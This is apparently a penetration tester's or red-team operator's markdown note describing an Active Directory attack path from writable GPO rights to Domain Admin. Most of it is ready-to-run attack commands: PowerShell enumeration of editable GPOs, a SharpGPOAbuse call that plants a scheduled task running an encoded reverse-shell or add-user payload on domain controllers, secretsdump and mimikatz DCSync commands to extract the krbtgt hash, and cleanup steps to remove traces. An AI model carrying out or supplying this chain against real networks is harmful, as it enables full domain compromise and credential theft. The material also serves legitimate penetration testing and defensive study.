---
title: "Attack Path: GPO Edit Rights → Code Exec on DCs → Domain Admin"
type: note
created: 2026-06-13
updated: 2026-06-13
tags: [attack-path, active-directory, gpo, privilege-escalation]
---

# Attack Path: GPO Edit Rights → Code Exec on DCs → Domain Admin

If a GPO linked to an OU containing Domain Controllers (or any Tier-0
system) is writable, that's a direct path to Domain Admin — no need for
Kerberos trickery at all.

## Chain

```
You (member of group with GenericWrite on a GPO)
  --GPO linked to "Domain Controllers" OU--
  --inject immediate scheduled task--> code exec as SYSTEM on DC
  --(SYSTEM on DC)--> dump krbtgt locally / DCSync
```

## Step 1 — Find writable GPOs and what they're linked to
```powershell
# Find GPOs you can edit
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {
  $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl|WriteOwner|WriteProperty"
}

# Check what each GPO is linked to — look for "Domain Controllers" OU or domain root
Get-DomainOU -Properties name,gplink,distinguishedname | Where-Object {$_.gplink -match "{<GPO GUID>}"}
```
See [[gpo-abuse]].

## Step 2 — Push an immediate scheduled task
```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "CORP\Admin" `
  --Command "cmd.exe" --Arguments "/c powershell -enc <base64 reverse-shell-or-add-user>" `
  --GPOName "Default Domain Controllers Policy"
```

## Step 3 — Wait for refresh (or force it if you have a foothold on the DC's network segment)
GPO refresh is every 90 min ± 0-30 min. The task fires once per refresh per
affected machine — on a DC, that's SYSTEM-level code execution.

## Step 4 — From SYSTEM on a DC, full domain compromise
```bash
# Either dump ntds.dit locally...
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL

# ...or just DCSync from this position
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```
See [[dcsync]], [[golden-silver-tickets]].

## Cleanup
SharpGPOAbuse changes persist in the GPO until removed — revert the GPT.ini
version and remove the injected task/policy XML, or use Synacktiv's
`GroupPolicyBackdoor` (`gpb.py gpo clean`) which tracks state for clean
removal.

## Related
- [[gpo-abuse]] — full enumeration/exploitation tooling
- [[acl-abuse]] — same "write rights on an object → control its scope" pattern, GPOs are just unusually high-blast-radius
- [[dcsync]], [[golden-silver-tickets]] — step 4
